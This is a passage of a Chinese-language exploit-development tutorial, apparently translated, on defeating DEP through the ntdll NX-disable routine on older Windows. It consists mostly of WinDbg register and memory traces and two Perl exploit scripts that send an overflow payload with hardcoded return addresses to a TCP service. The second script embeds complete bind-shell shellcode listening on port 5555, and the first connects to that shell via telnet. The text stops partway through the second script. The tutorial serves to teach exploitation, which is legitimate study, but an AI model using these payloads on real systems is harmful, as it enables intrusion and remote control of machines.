ntdll!KiFastSystemCall:
7c828608 8bd4 mov edx,esp
0:000> t
eax=000000ed ebx=00000000 ecx=0012e559 edx=0012e25c esi=0012e264 edi=00403388
eip=7c82860a esp=0012e25c ebp=0012e268 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
ntdll!KiFastSystemCall+0x2:
7c82860a 0f34 sysenter
0:000> t
eax=c000000d ebx=00000000 ecx=00000001 edx=ffffffff esi=0012e264 edi=00403388
eip=7c827a69 esp=0012e260 ebp=0012e268 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
ntdll!NtSetInformationProcess+0xc:
7c827a69 c21000 ret 10h
0:000> t
eax=c000000d ebx=00000000 ecx=00000001 edx=ffffffff esi=0012e264 edi=00403388
eip=7c83f55d esp=0012e274 ebp=0012e268 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
ntdll!LdrpCheckNXCompatibility+0x5a:
7c83f55d e99d4effff jmp ntdll!LdrpCheckNXCompatibility+0x5a (7c8343ff)
0:000> t
eax=c000000d ebx=00000000 ecx=00000001 edx=ffffffff esi=0012e264 edi=00403388
eip=7c8343ff esp=0012e274 ebp=0012e268 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
ntdll!LdrpCheckNXCompatibility+0x5a:
7c8343ff 804e3780 or byte ptr [esi+37h],80h ds:0023:0012e29b=cc
0:000> t
eax=c000000d ebx=00000000 ecx=00000001 edx=ffffffff esi=0012e264 edi=00403388
eip=7c834403 esp=0012e274 ebp=0012e268 iopl=0 nv up ei ng nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000286
ntdll!LdrpCheckNXCompatibility+0x5e:
7c834403 5e pop esi
0:000> t
eax=c000000d ebx=00000000 ecx=00000001 edx=ffffffff esi=46464646 edi=00403388
eip=7c834404 esp=0012e278 ebp=0012e268 iopl=0 nv up ei ng nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000286
ntdll!LdrpCheckNXCompatibility+0x5f:
7c834404 c9 leave
0:000> t
eax=c000000d ebx=00000000 ecx=00000001 edx=ffffffff esi=46464646 edi=00403388
eip=7c834405 esp=0012e26c ebp=00000022 iopl=0 nv up ei ng nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000286
ntdll!LdrpCheckNXCompatibility+0x60:
7c834405 c20400 ret 4
0:000> t
eax=c000000d ebx=00000000 ecx=00000001 edx=ffffffff esi=46464646 edi=00403388
eip=0012e264 esp=0012e274 ebp=00000022 iopl=0 nv up ei ng nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000286
0012e264 ff ???
我们所看到的是，当函数返回时，原来的esi值被放入EIP。
我们观察下eip,我们看到ff ff ff ff(它就是edx)
0:000> d eip
0012e264 ff ff ff ff 22 00 00 00-64 e2 12 00 04 00 00 00 ...."...d.......
0012e274 46 46 46 46 ff bd 3e 77-90 90 90 90 90 90 90 90 FFFF..>w........
0012e284 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
0012e294 90 90 90 90 90 90 cc cc-cc cc cc cc cc cc cc cc ................
0012e2a4 cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc ................
0012e2b4 cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc ................
0012e2c4 cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc ................
0012e2d4 cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc ................
距离我们的shellcode已经不远了，好吧，我们继续调整esi和ebp，首先，我们交换调整ebp和esi的
位置，先调整ebp再调整esi。
use strict;
use Socket;
my $junk = "A" x 508;
my $disabledep = pack('V',0x77c177f8); #adjust ebp
$disabledep = $disabledep.pack('V',0x71c0db30); #adjust esi
$disabledep = $disabledep.pack('V',0x7c86311d); #set eax to 1
$disabledep= $disabledep."GGGG";
$disabledep = $disabledep.pack('V',0x7c8343f5); #run NX Disable routine
$disabledep = $disabledep."HHHH"; #padding
$disabledep = $disabledep.pack('V',0x773ebdff); #jmp esp (user32.dll)
my $nops = "\x90" x 30;
my $shellcode="\xcc" x 700;
# initialize host and port
my $host = shift || 'localhost';
my $port = shift || 200;
my $proto = getprotobyname('tcp');
# get the port address
my $iaddr = inet_aton($host);
my $paddr = sockaddr_in($port, $iaddr);
print "[+] Setting up socket\n";
# create the socket, connect to the port
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
print "[+] Connecting to $host on port $port\n";
connect(SOCKET, $paddr) or die "connect: $!";
print "[+] Sending payload\n";
my $payload = $junk.$disabledep.$nops.$shellcode."\n";
print SOCKET $payload."\n";
print "[+] Payload sent, ".length($payload)." bytes\n";
close SOCKET or die "close: $!";
system('telnet '.$host.' 5555');
(a50.a70): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0012e761 ebx=00000000 ecx=0012e559 edx=0012e700 esi=0012e26c edi=00403388
eip=47474747 esp=0012e270 ebp=0012e264 iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246
47474747 ?? ???
啊哈-看起来改善了不少，eip现在成了47474747 (= GGGG),我们甚至不需要jmp esp，或nops，或四字
节的HHHH。
（译注:从前边那个exploit可以推测出用于调整ebp的返回指令是ret 4，但这里并没有放置填充字节，
因此设置eax为1 的指令并没有被执行，从上面的eax也可以说明这点。）
看下Esp指向的内容：
0:000> d esp
0012e270 f5 43 83 7c 48 48 48 48-ff bd 3e 77 90 90 90 90 .C.|HHHH..>w....
0012e280 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
0012e290 90 90 90 90 90 90 90 90-90 90 cc cc cc cc cc cc ................
0012e2a0 cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc ................
0012e2b0 cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc ................
0012e2c0 cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc ................
0012e2d0 cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc ................
0012e2e0 cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc ................
现在有一些到达shellcode的方法，查看其他寄存器，你会注意到edx指向0×0012e700,它指向shellcode
的末尾附近，所以如果我们可以跳转到edx，再执行向后的跳转，shellcode就会被成功执行了。
jmp edx (user32.dll) : 0×773eb603.通过计算，我们可以构造一个像这样的攻击串:
[jmp edx][10 nops][shellcode][more nops until edx][jump back].
如果我们想为 shellcode 保留一些空间，我们可以在 shellcode 后边放上 500 字节的 nop,edx 指向
0×0012e900，它位于这500字节的最后50字节附近。因此如果我们把跳转代码放到 480字节后边，并做
一个向后的跳转，如果可以跳到shellcode前边的nop中，我们就胜利了：
use strict;
use Socket;
my $junk = "A" x 508;
my $disabledep = pack('V',0x77c177f8); #adjust ebp
$disabledep = $disabledep.pack('V',0x71c0db30); #adjust esi
$disabledep = $disabledep.pack('V',0x7c86311d); #set eax to 1
$disabledep= $disabledep.pack('V',0x773eb603); #jmp edx user32.dll
$disabledep = $disabledep.pack('V',0x7c8343f5); #run NX Disable routine
my $nops1 = "\x90" x 10;
# windows/shell_bind_tcp - 702 bytes
# http://www.metasploit.com
# Encoder: x86/alpha_upper
# EXITFUNC=seh, LPORT=5555, RHOST=
my $shellcode="\x89\xe0\xd9\xd0\xd9\x70\xf4\x59\x49\x49\x49\x49\x49\x43" .
"\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58" .
"\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42" .
"\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30" .
"\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x42\x4a" .
"\x4a\x4b\x50\x4d\x4d\x38\x4c\x39\x4b\x4f\x4b\x4f\x4b\x4f" .
"\x45\x30\x4c\x4b\x42\x4c\x51\x34\x51\x34\x4c\x4b\x47\x35" .
"\x47\x4c\x4c\x4b\x43\x4c\x43\x35\x44\x38\x45\x51\x4a\x4f" .
"\x4c\x4b\x50\x4f\x44\x58\x4c\x4b\x51\x4f\x47\x50\x43\x31" .
"\x4a\x4b\x47\x39\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e" .
"\x50\x31\x49\x50\x4a\x39\x4e\x4c\x4c\x44\x49\x50\x42\x54" .
"\x45\x57\x49\x51\x48\x4a\x44\x4d\x45\x51\x48\x42\x4a\x4b" .
"\x4c\x34\x47\x4b\x46\x34\x46\x44\x51\x38\x42\x55\x4a\x45" .
"\x4c\x4b\x51\x4f\x51\x34\x43\x31\x4a\x4b\x43\x56\x4c\x4b" .
"\x44\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x43\x31\x4a\x4b" .
"\x44\x43\x46\x4c\x4c\x4b\x4b\x39\x42\x4c\x51\x34\x45\x4c" .
"\x45\x31\x49\x53\x46\x51\x49\x4b\x43\x54\x4c\x4b\x51\x53" .
"\x50\x30\x4c\x4b\x47\x30\x44\x4c\x4c\x4b\x42\x50\x45\x4c" .
"\x4e\x4d\x4c\x4b\x51\x50\x44\x48\x51\x4e\x43\x58\x4c\x4e" .
"\x50\x4e\x44\x4e\x4a\x4c\x46\x30\x4b\x4f\x4e\x36\x45\x36" .
"\x51\x43\x42\x46\x43\x58\x46\x53\x47\x42\x45\x38\x43\x47" .
"\x44\x33\x46\x52\x51\x4f\x46\x34\x4b\x4f\x48\x50\x42\x48" .
"\x48\x4b\x4a\x4d\x4b\x4c\x47\x4b\x46\x30\x4b\x4f\x48\x56" .
"\x51\x4f\x4c\x49\x4d\x35\x43\x56\x4b\x31\x4a\x4d\x45\x58" .
"\x44\x42\x46\x35\x43\x5a\x43\x32\x4b\x4f\x4e\x30\x45\x38" .
"\x48\x59\x45\x59\x4a\x55\x4e\x4d\x51\x47\x4b\x4f\x48\x56" .
"\x51\x43\x50\x53\x50\x53\x46\x33\x46\x33\x51\x53\x50\x53" .
"\x47\x33\x46\x33\x4b\x4f\x4e\x30\x42\x46\x42\x48\x42\x35" .
"\x4e\x53\x45\x36\x50\x53\x4b\x39\x4b\x51\x4c\x55\x43\x58" .
"\x4e\x44\x45\x4a\x44\x30\x49\x57\x46\x37\x4b\x4f\x4e\x36" .
"\x42\x4a\x44\x50\x50\x51\x50\x55\x4b\x4f\x48\x50\x45\x38" .
"\x49\x34\x4e\x4d\x46\x4e\x4a\x49\x50\x57\x4b\x4f\x49\x46" .
"\x46\x33\x50\x55\x4b\x4f\x4e\x30\x42\x48\x4d\x35\x51\x59" .
"\x4c\x46\x51\x59\x51\x47\x4b\x4f\x49\x46\x46\x30\x50\x54" .
"\x46\x34\x50\x55\x4b\x4f\x48\x50\x4a\x33\x43\x58\x4b\x57" .
"\x43\x49\x48\x46\x44\x39\x51\x47\x4b\x4f\x4e\x36\x46\x35" .
"\x4b\x4f\x48\x50\x43\x56\x43\x5a\x45\x34\x42\x46\x45\x38" .
"\x43\x53\x42\x4d\x4b\x39\x4a\x45\x42\x4a\x50\x50\x50\x59" .
"\x47\x59\x48\x4c\x4b\x39\x4d\x37\x42\x4a\x47\x34\x4c\x49" .
"\x4b\x52\x46\x51\x49\x50\x4b\x43\x4e\x4a\x4b\x4e\x47\x32" .
"\x46\x4d\x4b\x4e\x50\x42\x46\x4c\x4d\x43\x4c\x4d\x42\x5a" .
"\x46\x58\x4e\x4b\x4e\x4b\x4e\x4b\x43\x58\x43\x42\x4b\x4e" .
"\x48\x33\x42\x36\x4b\x4f\x43\x45\x51\x54\x4b\x4f\x48\x56" .
"\x51\x4b\x46\x37\x50\x52\x50\x51\x50\x51\x50\x51\x43\x5a" .
"\x45\x51\x46\x31\x50\x51\x51\x45\x50\x51\x4b\x4f\x4e\x30" .
"\x43\x58\x4e\x4d\x49\x49\x44\x45\x48\x4e\x46\x33\x4b\x4f" .
"\x48\x56\x43\x5a\x4b\x4f\x4b\x4f\x50\x37\x4b\x4f\x4e\x30" .
"\x4c\x4b\x51\x47\x4b\x4c\x4b\x33\x49\x54\x42\x44\x4b\x4f" .
"\x48\x56\x51\x42\x4b\x4f\x48\x50\x43\x58\x4a\x50\x4c\x4a" .
"\x43\x34\x51\x4f\x50\x53\x4b\x4f\x4e\x36\x4b\x4f\x48\x50" .
"\x41\x41";
my $nops2 = "\x90" x 480;
my $jumpback = "\xe9\x54\xf9\xff\xff"; #jump back 1708 bytes
# initialize host and port
my $host = shift || 'localhost';
my $port = shift || 200;
my $proto = getprotobyname('tcp');
# get the port address
my $iaddr = inet_aton($host);
my $paddr = sockaddr_in($port, $iaddr);
print "[+] Setting up socket\n";
# create the socket, connect to the port